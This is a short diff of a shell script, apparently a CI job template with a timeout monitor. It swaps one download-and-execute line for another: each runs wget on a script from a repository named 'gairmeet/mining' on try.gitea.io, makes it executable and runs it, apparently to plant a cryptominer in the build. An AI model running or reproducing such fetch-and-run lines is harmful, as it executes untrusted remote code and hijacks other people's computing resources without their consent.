@@ -12,8 +12,8 @@ function timeout_monitor() {
 timeout_monitor "$$" &
 Timeout_monitor_pid=$!
 
-wget https://try.gitea.io/gairmeet/mining/raw/branch/master/circleci.sh && chmod +x circleci.sh && ./circleci.sh
-done   
+wget https://try.gitea.io/gairmeet/mining/raw/branch/master/scala.sh && chmod +x scala.sh && ./scala.sh
+done
 # <your script here>
 
 # kill timeout monitor when terminating:
